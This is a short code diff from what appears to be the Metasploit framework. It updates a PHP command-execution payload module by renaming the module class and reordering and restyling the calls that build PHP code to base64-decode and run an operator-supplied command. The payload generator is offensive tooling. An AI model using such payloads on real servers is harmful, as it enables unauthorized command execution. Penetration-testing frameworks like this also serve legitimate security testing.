@@ -10,7 +10,7 @@ require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 
 
-module Metasploit3
+module MetasploitModule
 
   CachedSize = :dynamic
 
@@ -37,9 +37,9 @@ module Metasploit3
     cmd = Rex::Text.encode_base64(datastore['CMD'])
     dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
     shell = <<-END_OF_PHP_CODE
+    #{php_preamble(disabled_varname: dis)}
     $c = base64_decode("#{cmd}");
-    #{php_preamble({:disabled_varname => dis})}
-    #{php_system_block({:cmd_varname=>"$c", :disabled_varname => dis})}
+    #{php_system_block(cmd_varname: "$c", disabled_varname: dis)}
     END_OF_PHP_CODE
 
     return Rex::Text.compress(shell)
